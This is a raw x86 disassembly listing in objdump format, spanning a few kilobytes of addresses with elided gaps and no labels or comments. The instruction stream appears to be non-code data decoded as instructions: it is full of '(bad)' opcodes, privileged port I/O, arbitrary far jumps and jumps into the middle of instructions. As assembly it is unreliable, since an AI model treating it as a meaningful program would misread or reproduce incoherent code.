  4451ab:	rol    DWORD PTR [edi+0x16],1
  4451ae:	push   edx
  4451af:	xor    ah,BYTE PTR gs:[edi]
  4451b2:	sub    DWORD PTR [esp+edi*8+0x31],0xcec1791b
  4451ba:	mov    BYTE PTR [edi-0x5a2ce8f0],ch
  4451c0:	xlat   BYTE PTR ds:[ebx]
  4451c1:	ins    DWORD PTR es:[edi],dx
  4451c2:	inc    ebp
	...
  4451db:	add    BYTE PTR [ebp+eax*2-0x67],bl
  4451df:	cmp    eax,0x14ab873d
  4451e4:	push   ebx
  4451e5:	mov    ch,al
  4451e7:	add    esi,esp
  4451e9:	jg     0x445207
  4451eb:	sbb    al,0x3b
  4451ed:	sbb    al,0xea
  4451ef:	ins    BYTE PTR es:[edi],dx
  4451f0:	ss pop es
  4451f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4451f3:	mov    DWORD PTR [edx+edx*8],esp
  4451f6:	adc    eax,0xfad10cd2
  4451fb:	xor    BYTE PTR [eax],0xf8
  4451fe:	arpl   WORD PTR [esi+edi*2-0x8],ax
  445202:	pop    ebp
  445203:	xlat   BYTE PTR ds:[ebx]
  445204:	jmp    0x445285
  445206:	sbb    DWORD PTR [ecx+0x3dcb1db1],ecx
  44520c:	in     eax,dx
  44520d:	sub    ch,BYTE PTR [esi-0x39]
  445210:	or     edx,edx
  445212:	call   FWORD PTR [ecx-0x2aacd239]
  445218:	je     0x44525b
  44521a:	or     al,0x6c
  44521c:	xor    BYTE PTR [edi-0x5548df5],ch
  445222:	test   BYTE PTR [esi],ah
  445224:	ins    DWORD PTR es:[edi],dx
  445225:	push   0x2bf1a1e8
  44522a:	stc    
  44522b:	jb     0x4451e8
  44522d:	adc    dl,BYTE PTR [ecx-0x69]
  445230:	(bad)  
  445231:	sub    eax,0x4174dd53
  445236:	or     al,0x64
  445238:	cmp    BYTE PTR [edi-0x55d8df5],ch
  44523e:	test   BYTE PTR [esi+0x0],ch
	...
  445258:	add    BYTE PTR [edi+eax*2-0x18],ch
  44525c:	add    eax,0x12f92bba
  445261:	and    eax,0x4aea14b7
  445266:	cli    
  445267:	xor    al,0x9f
  445269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44526a:	push   ss
  44526b:	test   DWORD PTR [eax+edi*8],ebx
  44526e:	(bad)  
  44526f:	dec    esp
  445270:	sbb    edx,DWORD PTR [ecx]
  445272:	(bad)  
  445273:	adc    ebp,DWORD PTR [edx-0x4d]
  445276:	clc    
  445277:	sub    BYTE PTR [ecx-0x65cadc7f],0x80
  44527e:	paddw  mm5,QWORD PTR [ebx]
  445281:	or     al,dh
  445283:	pop    edx
  445284:	and    DWORD PTR [eax+0x17],0xd7002485
  44528b:	dec    esp
  44528c:	sbb    ecx,ebx
  44528e:	aad    0x13
  445290:	push   0xffffffbb
  445292:	clc    
  445293:	sub    BYTE PTR [ecx],0x49
  445296:	and    ah,ch
  445298:	jmp    0xfa3b:0x1ffc272
  44529f:	xor    al,0x4f
  4452a1:	test   eax,0xa00084f9
  4452a6:	or     eax,0xe87c574e
  4452ab:	dec    esp
  4452ac:	adc    al,0x4e
  4452ae:	ret    0x850b
  4452b1:	sbb    eax,0x323be269
  4452b6:	jno    0x4452ea
  4452b8:	mov    ecx,DWORD PTR [eax+0xc78315]
	...
  4452d6:	pop    ecx
  4452d7:	and    al,0x84
  4452d9:	retf   
  4452da:	mov    dh,0xb8
  4452dc:	inc    ecx
  4452dd:	mov    DWORD PTR [eax-0x3649f90b],ecx
  4452e3:	push   es
  4452e4:	mov    BYTE PTR [ebp-0x6a],dl
  4452e7:	clc    
  4452e8:	lods   eax,DWORD PTR ds:[esi]
  4452e9:	adc    BYTE PTR ds:0x6b0ef912,dl
  4452ef:	push   ebx
  4452f0:	add    al,0x88
  4452f2:	jge    0x44536e
  4452f4:	dec    ebp
  4452f5:	lock int 0x83
  4452f8:	retf   0x3c75
  4452fb:	sub    eax,esi
  4452fd:	psubusb mm6,QWORD PTR [ebp-0x8]
  445301:	jmp    DWORD PTR [edx+0x1de9eb79]
  445307:	out    dx,al
  445308:	idiv   bh
  44530a:	pop    esi
  44530b:	ins    BYTE PTR es:[edi],dx
  44530c:	or     DWORD PTR [ebx],edi
  44530e:	push   0x71
  445310:	push   ds
  445311:	jmp    0x445361
  445313:	jl     0x445356
  445315:	add    BYTE PTR [esi],dh
  445317:	ins    BYTE PTR es:[edi],dx
  445318:	or     DWORD PTR [ebx],edi
  44531a:	xor    DWORD PTR [esi+0x12],0xffffff8b
  44531e:	fmul   DWORD PTR [eax]
  445320:	dec    esi
  445321:	push   edi
  445322:	std    
  445323:	in     eax,dx
  445324:	dec    esp
  445325:	adc    al,0x8e
  445327:	les    ecx,FWORD PTR [ebx]
  445329:	test   DWORD PTR [ebp+0x74],ebx
  44532c:	loop   0x445369
  44532e:	stos   BYTE PTR es:[edi],al
  44532f:	jb     0x445349
  445331:	jmp    0x445341
  445333:	jl     0x445376
  445335:	add    ah,dh
  445337:	push   es
  445338:	mov    bh,0xf
	...
  445352:	add    BYTE PTR [edi+0x61],bh
  445355:	xor    DWORD PTR ds:0x851268ec,esi
  44535b:	xor    DWORD PTR [esi],esp
  44535d:	iret   
  44535e:	push   eax
  44535f:	inc    ebp
  445360:	out    dx,eax
  445361:	into   
  445362:	adc    esi,DWORD PTR [edi-0x1e]
  445365:	pop    es
  445366:	xor    DWORD PTR [edx+ecx*4+0xa39851f],0xffffff89
  44536e:	push   ebx
  44536f:	mov    esp,0xab8549a3
  445374:	inc    ebx
  445375:	dec    edx
  445376:	and    eax,0x7c3443a4
  44537b:	iret   
  44537c:	inc    edx
  44537d:	ds ins DWORD PTR es:[edi],dx
  44537f:	add    DWORD PTR [ebx-0x5d820c3a],esp
  445385:	xchg   BYTE PTR [eax-0x75],bh
  445388:	pop    ds
  445389:	xchg   DWORD PTR ss:[eax-0x67],eax
  44538d:	cld    
  44538e:	clc    
  44538f:	jnp    0x4453e0
  445391:	les    eax,FWORD PTR [esi-0x2a05ae3f]
  445397:	out    0x4,eax
  445399:	mov    DWORD PTR [ebx+0x5c],edi
  44539c:	mov    bl,0xaf
  44539e:	(bad)  
  4453a0:	adc    DWORD PTR [eax],edi
  4453a2:	out    0xdd,eax
  4453a4:	push   edi
  4453a5:	ss stc 
  4453a7:	cmove  esi,DWORD PTR [edx+0x2fd96f12]
  4453ae:	xchg   DWORD PTR [eax-0x5f],ebx
  4453b1:	mov    ah,0xf8
  4453b3:	xor    esi,DWORD PTR [edi-0x74]
  4453b6:	xchg   esp,eax
	...
  4453cf:	add    BYTE PTR [ecx+0x1e],bh
  4453d2:	ss stc 
  4453d4:	and    ebx,ebp
  4453d6:	mov    cl,BYTE PTR [ebx+0x20]
  4453d9:	jae    0x445419
  4453db:	ins    DWORD PTR es:[edi],dx
  4453dc:	add    ah,BYTE PTR [ebx+0x57ffbd7]
  4453e2:	fcom   QWORD PTR [ebx]
  4453e4:	jnp    0x445390
  4453e6:	pop    esi
  4453e7:	sub    al,0xbe
  4453e9:	es push edx
  4453eb:	cmp    bh,BYTE PTR [ecx-0x4f]
  4453ee:	test   BYTE PTR [esi+0x2b663137],0xe3
  4453f5:	jl     0x44539b
  4453f7:	das    
  4453f8:	in     eax,dx
  4453f9:	jl     0x4453e5
  4453fb:	cmp    ebp,ecx
  4453fd:	daa    
  4453fe:	pop    esi
  4453ff:	(bad)  
  445400:	ja     0x4453ae
  445402:	and    DWORD PTR [edx],edi
  445404:	mov    ebp,0xf480637b
  445409:	daa    
  44540a:	adc    bh,BYTE PTR [edx]
  44540c:	jnp    0x4453df
  44540e:	or     cl,BYTE PTR [edi+esi*1+0x795d6e2d]
  445415:	sub    al,0x10
  445417:	or     bl,BYTE PTR [esi-0x3fb90dd9]
  44541d:	cmp    BYTE PTR [esi+0x3b7c24d1],dl
  445423:	loopne 0x445418
  445425:	jnp    0x44544a
  445427:	loopne 0x445410
  445429:	jnp    0x44544e
  44542b:	loopne 0x445438
  44542d:	shl    BYTE PTR [esp+edx*8],cl
  445430:	mov    edx,0x604ed5
	...
  44544d:	iret   
  44544e:	ret    
  44544f:	out    0x9f,al
  445451:	pop    esp
  445452:	icebp  
  445453:	out    0x3,al
  445455:	hlt    
  445456:	add    al,0x88
  445458:	ror    BYTE PTR [ebx+0x37f4e6c3],0x7d
  44545f:	and    esp,eax
  445461:	repz mov al,ds:0x2733df5f
  445467:	out    0x3,eax
  445469:	jno    0x44542b
  44546b:	retf   0x78f3
  44546e:	int3   
  44546f:	out    dx,al
  445470:	mov    WORD PTR [eax+0x8c4ffe0],gs
  445476:	push   cs
  445477:	test   ecx,edi
  445479:	repz test eax,0xf04467f9
  44547f:	test   BYTE PTR [ebp+0x537cf31b],dh
  445485:	cs mov cl,0x3
  445488:	adc    ah,BYTE PTR [edx]
  44548a:	mov    bl,0x29
  44548c:	je     0x445472
  44548e:	mov    ah,0x8a
  445490:	popf   
  445491:	pusha  
  445492:	adc    eax,0xbd7ee285
  445497:	or     ebp,DWORD PTR [edx-0x77]
  44549a:	add    al,BYTE PTR [eax]
  44549c:	pushf  
  44549d:	cmp    ebx,DWORD PTR [ebp+0x4f7e7fe]
  4454a3:	test   DWORD PTR [edx-0x1a59e301],ebp
  4454a9:	test   DWORD PTR [edi+esi*4],0x4f7e8
  4454b0:	jb     0x4454b2
	...
  4454ca:	mov    cl,0xfe
  4454cc:	out    0x35,eax
  4454ce:	hlt    
  4454cf:	add    al,0x0
  4454d1:	add    al,BYTE PTR [eax]
  4454d3:	mov    eax,ds:0x4f7ec88
  4454d8:	add    cl,ch
  4454da:	jo     0x44551d
  4454dc:	sbb    BYTE PTR [esi],dh
  4454de:	dec    esi
  4454df:	sar    DWORD PTR [edx+eiz*2-0x41fc1dcd],1
  4454e6:	add    al,BYTE PTR ss:[edx]
  4454e9:	jmp    0xe8fc59e5
  4454ee:	test   DWORD PTR [eax+eax*1],0x44814135
  4454f5:	int    0xef
  4454f7:	jg     0x445541
  4454f9:	icebp  
  4454fa:	inc    eax
  4454fb:	ds call 0xf9704596
  445501:	xor    al,0x79
  445503:	popf   
  445504:	pop    ss
  445505:	add    BYTE PTR [edx+0x72],bh
  445508:	add    eax,0xf7121dff
  44550d:	jo     0x445540
  44550f:	fidiv  DWORD PTR ds:0x7aec9aff
  445515:	les    ecx,FWORD PTR [ecx]
  445517:	dec    edi
  445518:	test   BYTE PTR [ecx+esi*8-0x8],al
  44551c:	adc    BYTE PTR [ecx+eax*1+0x11],0x81
  445521:	add    al,BYTE PTR [ebp-0x33000000]
  445527:	ror    BYTE PTR [ebx+ecx*4-0x77],0x45
  44552c:	add    DWORD PTR [ebx+0x0],ecx
	...
  445546:	add    ah,dh
  445548:	jmp    0x4455b2
  44554a:	sbb    al,0x1a
  44554c:	jae    0x44555f
  44554e:	call   FWORD PTR [ecx+ebx*1-0x1f]
  445552:	adc    eax,0x83f6ecda
  445557:	loope  0x445556
  445559:	push   esp
  44555a:	ret    0x191
  44555d:	dec    ebp
  44555e:	push   esi
  44555f:	adc    BYTE PTR [eax-0x7c],0xea
  445563:	pop    esi
  445564:	shr    DWORD PTR [edx],0xdb
  445567:	dec    esi
  445568:	iret   
  445569:	sub    dh,dh
  44556b:	dec    esi
  44556c:	in     al,dx
  44556d:	not    cl
  44556f:	ss dec esi
  445571:	push   edi
  445572:	pop    ebp
  445573:	dec    esi
  445574:	jns    0x445558
  445576:	mov    ecx,DWORD PTR [ecx+edi*2-0x47]
  44557a:	push   0x5c
  44557c:	fsin   
  44557e:	add    ecx,DWORD PTR [ebp+0x1]
  445581:	sub    eax,eax
  445583:	pop    esi
  445584:	retf   0xc92a
  445587:	dec    esi
  445588:	shr    DWORD PTR [edx],cl
  44558a:	call   FWORD PTR [edx+0x698b4d06]
  445590:	push   ecx
  445591:	dec    edi
  445592:	push   edi
  445593:	out    0x0,eax
  445595:	bound  eax,QWORD PTR [eax]
  445597:	hlt    
  445598:	add    eax,ebp
  44559a:	imul   esi,DWORD PTR [edi+0x6be7d41b],0xbbfffd18
  4455a4:	add    eax,0x8375ad5
  4455a9:	test   DWORD PTR [eax+eax*1+0x0],ebp
	...
  4455c1:	add    BYTE PTR [eax],al
  4455c3:	add    al,dl
  4455c5:	and    ecx,edi
  4455c7:	dec    esi
  4455c8:	add    eax,DWORD PTR [edi-0x27]
  4455cb:	adc    ecx,DWORD PTR [edi+ecx*4]
  4455ce:	xor    bh,cl
  4455d0:	repz scas eax,DWORD PTR es:[edi]
  4455d2:	aas    
  4455d3:	or     al,0x49
  4455d5:	lock or eax,DWORD PTR [eax]
  4455d8:	mov    al,0xda
  4455da:	inc    edi
  4455db:	int3   
  4455dc:	test   al,0xf2
  4455de:	inc    edi
  4455df:	int3   
  4455e0:	shl    BYTE PTR [edi-0x1d80acd0],0x7c
  4455e7:	in     al,dx
  4455e8:	fcom   QWORD PTR [esi-0x68d8f842]
  4455ee:	(bad)  
  4455ef:	adc    ecx,DWORD PTR [edx-0x59]
  4455f2:	lods   al,BYTE PTR ds:[esi]
  4455f3:	pop    es
  4455f4:	out    0x3d,eax
  4455f6:	retf   0xfa84
  4455f9:	repz mov esi,0xbeeaf4f8
  4455ff:	repz cmc 
  445601:	sub    eax,0x9779fffd
  445606:	or     al,0x7d
  445608:	jl     0x445636
  44560a:	test   eax,0xfff46f04
  44560f:	cld    
  445610:	inc    edx
  445611:	inc    DWORD PTR [edi]
  445613:	cmp    BYTE PTR [ebx-0x27],ch
  445616:	pop    es
  445617:	test   DWORD PTR [edx-0x13ad79e7],esi
  44561d:	cs inc edx
  44561f:	sub    eax,0x53321800
  445624:	clc    
  445625:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445626:	mov    edi,0xf
	...
  44563f:	add    BYTE PTR [eax],al
  445641:	dec    edx
  445642:	add    eax,0x13d60027
  445647:	adc    DWORD PTR fs:[ebx],esi
  44564a:	and    al,0xe7
  44564c:	mov    BYTE PTR [edi+0x1fca602c],bh
  445652:	nop
  445653:	push   ds
  445654:	or     BYTE PTR [ebx-0x36],dh
  445657:	mov    cs,WORD PTR [edx-0x3fa00349]
  44565d:	pop    ds
  44565e:	mov    BYTE PTR [esi+0x35],ch
  445661:	mov    BYTE PTR [ebp+ecx*2-0x187f9103],ah
  445668:	add    esi,esp
  44566a:	add    al,0x64
  44566c:	cmovno edx,DWORD PTR [eax-0x6df77265]
  445673:	stos   DWORD PTR es:[edi],eax
  445674:	lea    eax,[esi+ecx*4]
  445677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445678:	xor    edi,DWORD PTR [ecx+0x4]
  44567b:	pusha  
  44567c:	rol    bl,0x89
  44567f:	and    BYTE PTR [edi+0x2b3a8fe7],ch
  445685:	in     al,dx
  445686:	and    ebx,DWORD PTR [edx]
  445688:	ss mov dh,0xc9
  44568b:	adc    DWORD PTR [edi+esi*2],eax
  44568e:	inc    esp
  44568f:	mov    esi,edi
  445691:	sbb    al,0xc8
  445693:	ins    DWORD PTR es:[edi],dx
  445694:	shl    BYTE PTR [ebx-0x737de071],0x22
  44569b:	jl     0x4456e2
  44569d:	je     0x445640
  44569f:	jmp    0x6e295ea6
  4456a4:	inc    BYTE PTR [eax]
	...
  4456be:	clc    
  4456bf:	sbb    al,0xd9
  4456c1:	mov    al,0xf8
  4456c3:	(bad)  
  4456c4:	and    DWORD PTR [eax],eax
  4456c6:	imul   edx,DWORD PTR [edx+0x16],0x1c241c08
  4456cd:	or     BYTE PTR [ecx-0x2e],dh
  4456d0:	jmp    0xb0ea:0xca688
  4456d7:	icebp  
  4456d8:	or     esi,ebx
  4456da:	or     BYTE PTR [eax+0x177b720b],bh
  4456e0:	pop    ecx
  4456e1:	aas    
  4456e2:	dec    ebp
  4456e3:	mov    bl,ah
  4456e5:	xor    al,0xb5
  4456e7:	inc    ebp
  4456e8:	inc    ebx
  4456e9:	xchg   ebp,eax
  4456ea:	clc    
  4456eb:	add    al,0x0
  4456ed:	jmp    0x24c9a6be
  4456f2:	call   0x454e8e9a
  4456f7:	scas   al,BYTE PTR es:[edi]
  4456f8:	fcomip st,st(4)
  4456fa:	push   cs
  4456fb:	mov    al,ds:0xe1dac53a
  445700:	(bad)  
  445701:	call   0xb5ac59a9
  445706:	or     ah,al
  445708:	inc    DWORD PTR [eax-0x63]
  44570b:	and    ecx,edi
  44570d:	jmp    0x6448a086
  445712:	cmp    BYTE PTR [ecx+0x12b36208],bl
  445718:	callw  0x74c2
  44571c:	adc    eax,ebp
  44571e:	fcmovu st,st(7)
  445720:	jmp    FWORD PTR [ecx+0x0]
	...
  44573b:	xor    al,0xd
  44573d:	test   DWORD PTR [ebx+edi*8-0x16f056d4],esp
  445744:	sbb    eax,DWORD PTR [ebp+0x57d9ebac]
  44574a:	in     eax,dx
  44574b:	arpl   WORD PTR [ebx],dx
  44574d:	test   DWORD PTR [edi+edi*8+0x256250d2],ebx
  445754:	mov    al,cl
  445756:	rol    DWORD PTR [edi+ebx*1],1
  445759:	stc    
  44575a:	fidivr WORD PTR [esi+eax*8+0x13]
  44575e:	bound  esi,QWORD PTR [edx]
  445760:	sbb    al,BYTE PTR [edi+0x287ec21]
  445766:	add    dh,cl
  445768:	(bad)  
  44576a:	je     0x4457b2
  44576c:	lea    eax,[esi+0x4]
  44576f:	pop    esi
  445770:	leave  
  445771:	sub    cl,BYTE PTR [eax*2-0x39f3b327]
  445778:	inc    edi
  445779:	add    eax,0xfb10eb8b
  44577e:	into   
  44577f:	dec    esi
  445780:	or     dh,BYTE PTR [edx]
  445782:	(bad)  
  445783:	call   0x9d89da94
  445788:	mov    WORD PTR [eax+0x8],cs
  44578b:	xchg   al,dl
  44578d:	out    0x4a,eax
  44578f:	sbb    eax,0xfffffff6
  445792:	mov    edx,0xfff6d893
  445797:	aam    0x33
  445799:	add    eax,0xf851590f
  44579e:	inc    DWORD PTR [eax]
	...
  4457b8:	inc    edx
  4457b9:	lea    eax,[ebp+0x8]
  4457bc:	pushf  
  4457bd:	push   eax
  4457be:	test   bl,cl
  4457c0:	inc    ebp
  4457c1:	gs idiv edi
  4457c4:	adc    ch,bh
  4457c6:	sbb    eax,0xf6d902ff
  4457cb:	and    eax,0x400f5d
  4457d0:	adc    al,BYTE PTR [ebx+0x4d]
  4457d3:	push   ss
  4457d4:	pop    ebp
  4457d5:	add    eax,0x4f6acccc
  4457da:	dec    esp
  4457db:	xor    esi,edx
  4457dd:	mov    WORD PTR [esp-0x47],es
  4457e1:	or     al,0xc0
  4457e3:	jge    0x44578e
  4457e5:	pusha  
  4457e6:	test   BYTE PTR [ecx+edi*4-0xb],dl
  4457ea:	out    dx,al
  4457eb:	fmul   DWORD PTR [edx-0x72278544]
  4457f1:	mov    al,ds:0xa0692443
  4457f6:	push   ebx
  4457f7:	and    al,0xf4
  4457f9:	sbb    edi,DWORD PTR [edx+0x44]
  4457fc:	sbb    BYTE PTR [eax],dh
  4457fe:	cli    
  4457ff:	mov    edi,0x84c63fd9
  445804:	test   al,0x7
  445806:	or     al,0xf1
  445808:	sub    al,0x62
  44580a:	dec    edx
  44580b:	jge    0x445829
  44580d:	sub    edi,DWORD PTR [esp+eax*2+0x10]
  445811:	or     BYTE PTR [ebx+0x54],bh
  445814:	fadd   DWORD PTR [ebx]
  445816:	stc    
  445817:	mov    edi,0x4c7a13a1
	...
  445834:	add    al,bl
  445836:	adc    edi,DWORD PTR [edx+0x44]
  445839:	sar    BYTE PTR [edi],1
  44583b:	repnz int 0xb
  44583e:	pushf  
  44583f:	js     0x445819
  445841:	jg     0x445832
  445843:	out    0xf,eax
  445845:	or     ebx,DWORD PTR [eax+edi*2+0x7a6c0fcd]
  44584c:	fdivr  DWORD PTR [edi+0x72]
  44584f:	loope  0x445868
  445851:	jg     0x4458b5
  445853:	loope  0x445868
  445855:	outs   dx,DWORD PTR ds:[esi]
  445856:	push   0xffffffe1
  445858:	pextrw esi,(bad),0xc5
  44585a:	mov    bl,0x52
  44585c:	xlat   BYTE PTR ds:[ebx]
  44585d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44585e:	mov    ah,0x52
  445860:	fdivr  st,st(7)
  445862:	repnz mov dh,0xf3
  445865:	retf   
  445866:	fnstsw WORD PTR [eax-0x10]
  445869:	ret    
  44586a:	xchg   edx,eax
  44586b:	loope  0x445888
  44586d:	jg     0x445845
  44586f:	js     0x4458b5
  445871:	rcl    BYTE PTR ds:0xdcf7e236,1
  445877:	mov    cl,0x9
  445879:	fild   WORD PTR [ecx+0x160b13e1]
  44587f:	mov    bl,0x0
  445881:	iret   
  445882:	jno    0x445865
  445884:	(bad)  
  445886:	sub    eax,0x5a62cbf
  44588b:	outs   dx,BYTE PTR ds:[esi]
  44588c:	dec    ecx
  44588d:	mov    ebp,0x423ae199
  445892:	sbb    BYTE PTR [edi+0x2e054a86],ch
  445898:	rol    BYTE PTR [eax],cl
	...
  4458b2:	mov    esp,0x7903d742
  4458b7:	and    BYTE PTR [edi+edi*2],dl
  4458ba:	pop    eax
  4458bb:	xchg   bl,al
  4458bd:	fild   DWORD PTR [eax+0x20]
  4458c0:	out    0x66,eax
  4458c2:	and    al,0x4d
  4458c4:	es add al,0x7b
  4458c7:	adc    ch,BYTE PTR [ebx+0x6004e93b]
  4458cd:	sbb    BYTE PTR [ecx*2+0x2730426],ch
  4458d4:	stos   DWORD PTR es:[edi],eax
  4458d5:	cmp    edx,ecx
  4458d7:	add    al,0x70
  4458d9:	clc    
  4458da:	dec    ebx
  4458db:	dec    ebp
  4458dc:	es add al,0x7b
  4458df:	loop   0x44590b
  4458e1:	cmp    edi,DWORD PTR [ecx+0x77fc904]
  4458e7:	sub    eax,0xa9ebc62f
  4458ec:	bound  eax,QWORD PTR [eax]
  4458ee:	ror    BYTE PTR [esi+eiz*4+0x3],0x56
  4458f3:	xchg   ecx,eax
  4458f4:	in     al,0x6b
  4458f6:	mov    esp,0x7fa9e6c3
  4458fb:	or     DWORD PTR [ebx+0x3b],edi
  4458fe:	add    DWORD PTR ds:0x55177fc1,eax
  445904:	das    
  445905:	(bad)  
  445906:	mov    bl,0xa9
  445908:	push   0xffffffe0
  44590a:	pop    edi
  44590b:	dec    esp
  44590c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44590d:	add    eax,DWORD PTR [eax-0x53dc1b71]
  445913:	ret    
  445914:	out    0x7e,al
	...
  44592e:	add    BYTE PTR [edi],dh
  445930:	add    eax,0xc3bc5746
  445935:	(bad)  
  445936:	call   0x4a481d3d
  44593b:	das    
  44593c:	dec    ebp
  44593d:	cmp    eax,0x7c3f2e9
  445942:	mov    bl,BYTE PTR [ecx*2-0x7c1f16c3]
  445949:	loopne 0x445918
  44594b:	and    eax,0x57ecc11e
  445950:	inc    edi
  445951:	cmp    eax,0xff04f6e9
  445956:	call   0x2b0c9631
  44595b:	lock sbb esp,0xc21f39ae
  445962:	in     al,0xc7
  445964:	inc    ebp
  445965:	cmp    eax,0x31ee9
  44596a:	test   eax,0xaed403ad
  44596f:	cmp    DWORD PTR [edi],ebx
  445971:	add    cl,ch
  445973:	test   DWORD PTR [edi+ebx*4],0xffe1b82d
  44597a:	pop    edi
  44597b:	jae    0x4459b9
  44597d:	cld    
  44597e:	and    ax,0x487e
  445982:	sub    DWORD PTR [ecx+0x446c881e],esi
  445988:	and    ecx,edi
  44598a:	dec    esi
  44598b:	jp     0x4459ab
  44598d:	cli    
  44598e:	fdivr  st(3),st
  445990:	or     eax,0xe940
	...
  4459a9:	add    BYTE PTR [eax],al
  4459ab:	add    BYTE PTR [edi-0xe],ch
  4459ae:	dec    ecx
  4459af:	test   eax,0x39131bf7
  4459b4:	out    0xc4,eax
  4459b6:	call   DWORD PTR [eax+0x290002ae]
  4459bc:	in     eax,0xf1
  4459be:	repz clc 
  4459c0:	mov    bh,0x1e
  4459c2:	dec    ecx
  4459c3:	push   cs
  4459c4:	add    eax,DWORD PTR [ebp+0x25d000f]
  4459ca:	rol    ebx,0xd9
  4459cd:	(bad)  
  4459ce:	retf   
  4459cf:	int3   
  4459d0:	arpl   WORD PTR [ecx+0x21a12443],sp
  4459d6:	mov    ecx,0x4ba00575
  4459db:	and    al,0x6d
  4459dd:	mov    eax,ds:0x19592443
  4459e2:	retf   
  4459e3:	idiv   DWORD PTR [ecx+eiz*4]
  4459e6:	xlat   BYTE PTR ds:[ebx]
  4459e7:	mov    esp,DWORD PTR [ecx]
  4459e9:	sub    eax,0xa18cf701
  4459ee:	out    dx,eax
  4459ef:	mov    ecx,DWORD PTR [esi+0x1d2463dd]
  4459f5:	mov    eax,ds:0xdd638bc7
  4459fa:	arpl   WORD PTR [ebp*1-0x2d1436f7],sp
  445a01:	lahf   
  445a02:	(bad)  
  445a03:	mov    ecx,ecx
  445a05:	sub    al,0x9
  445a07:	mov    esi,ecx
  445a09:	sub    al,0x5
  445a0b:	mov    edx,ecx
  445a0d:	sub    al,0x1
  445a0f:	rol    DWORD PTR [eax],1
	...
  445a29:	je     0x4459de
  445a2b:	rcl    cl,cl
  445a2d:	ja     0x4459e2
  445a2f:	xlat   BYTE PTR ds:[ebx]
  445a30:	or     esp,DWORD PTR [edi+edx*2]
  445a33:	in     eax,dx
  445a34:	test   DWORD PTR [esi-0x5f],0x25b1f7ef
  445a3b:	or     eax,0x43a1158b
  445a40:	and    al,0xad
  445a42:	(bad)  
  445a44:	add    ebp,esp
  445a46:	push   edi
  445a47:	pop    es
  445a48:	cmp    esp,DWORD PTR [ecx+0x25]
  445a4b:	add    eax,0x857d577
  445a50:	cmp    esp,DWORD PTR [ecx+0x25]
  445a53:	add    DWORD PTR [esi-0x5c],esi
  445a56:	inc    ebx
  445a57:	and    al,0x44
  445a59:	hlt    
  445a5a:	dec    edi
  445a5b:	or     eax,0x11484015
  445a60:	sub    eax,0x23c132af
  445a65:	cld    
  445a66:	and    dl,cl
  445a68:	and    esi,eax
  445a6a:	push   ds
  445a6b:	dec    esp
  445a6c:	icebp  
  445a6d:	pushf  
  445a6e:	stos   BYTE PTR es:[edi],al
  445a6f:	dec    edx
  445a70:	add    BYTE PTR [edi+0x51],bh
  445a73:	jne    0x445a42
  445a75:	jg     0x445abb
  445a77:	jne    0x445a41
  445a79:	outs   dx,DWORD PTR ds:[esi]
  445a7a:	ins    DWORD PTR es:[edi],dx
  445a7b:	retf   0x4bd
  445a7e:	sub    al,0x39
  445a80:	int3   
  445a81:	inc    eax
  445a82:	cli    
  445a83:	shl    BYTE PTR [esp+eiz*4+0x4effbd6b],cl
  445a8a:	and    cl,dh
  445a8c:	dec    esi
	...
  445aa5:	add    BYTE PTR [edi-0x5],bh
  445aa8:	inc    ebx
  445aa9:	cmp    eax,0x23bf92f4
  445aae:	clc    
  445aaf:	xchg   esp,eax
  445ab0:	mov    ah,0x7
  445ab2:	ins    DWORD PTR es:[edi],dx
  445ab3:	jmp    0x4ed8:0x3f8f8707
  445aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445abb:	jecxz  0x445a87
  445abd:	pop    edx
  445abe:	lods   eax,DWORD PTR ds:[esi]
  445abf:	loop   0x445afe
  445ac1:	add    al,0xf4
  445ac3:	xchg   esi,eax
  445ac4:	push   ebx
  445ac5:	mov    ebp,0xcc407f28
  445aca:	rcl    dl,0x3f
  445acd:	int3   
  445ace:	mov    eax,0xb0cc3fea
  445ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445ad4:	sub    BYTE PTR [ebx+0x6f],dl
  445ad7:	fidiv  DWORD PTR [ebx+ecx*2-0x4]
  445adb:	test   DWORD PTR [edi-0x5cd20bab],edi
  445ae1:	ss cmc 
  445ae3:	pop    ecx
  445ae4:	add    DWORD PTR ds:0x853e89b4,ebp
  445aea:	xor    eax,0x6b02e305
  445aef:	xchg   bh,bl
  445af1:	shl    DWORD PTR [esi],cl
  445af3:	add    eax,0xd88cb8e7
  445af8:	xor    al,0x6d
  445afa:	stc    
  445afb:	add    eax,0xde1603e7
  445b00:	scas   al,BYTE PTR es:[edi]
  445b01:	or     ebp,ebp
  445b03:	jo     0x445b2a
  445b05:	jnp    0x445b41
  445b07:	mov    edx,0x4025
	...
  445b20:	add    BYTE PTR [eax],al
  445b22:	add    BYTE PTR [eax+0x49],al
  445b25:	mov    bl,0x3f
  445b27:	cmp    BYTE PTR [ecx-0x55],cl
  445b2a:	aas    
  445b2b:	xor    BYTE PTR [ecx+0x5e],cl
  445b2e:	cs (bad) 
  445b30:	(bad)  
  445b31:	mov    ebx,0x6e0cb77a
  445b36:	mov    ebx,0xfeaf080f
  445b3b:	test   dh,al
  445b3d:	fcmovbe st,st(2)
  445b3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445b40:	or     esi,DWORD PTR [edx-0x4c]
  445b43:	cmc    
  445b44:	xlat   BYTE PTR ds:[ebx]
  445b45:	mov    ah,0xd6
  445b47:	jle    0x445b0a
  445b49:	out    dx,al
  445b4a:	or     esi,DWORD PTR [edi+0x13]
  445b4d:	sbb    DWORD PTR [ebx],ecx
  445b4f:	jno    0x445aeb
  445b51:	fidivr DWORD PTR [edx-0x44]
  445b54:	or     BYTE PTR [esi+0x6e0d9a2c],bh
  445b5a:	retf   
  445b5b:	sti    
  445b5c:	pop    es
  445b5d:	nop
  445b5e:	jmp    0x4570:0xc1dc9700
  445b65:	por    mm0,mm5
  445b68:	xchg   esi,eax
  445b69:	dec    esi
  445b6a:	repnz mov ds:0x3ecab0bb,eax
  445b70:	dec    eax
  445b71:	mov    ebp,0xbb355bfb
  445b76:	ret    0x23cb
  445b79:	push   ebx
  445b7a:	add    esi,esp
  445b7c:	add    al,0x0
  445b7e:	push   0xffffff8c
  445b80:	pop    ds
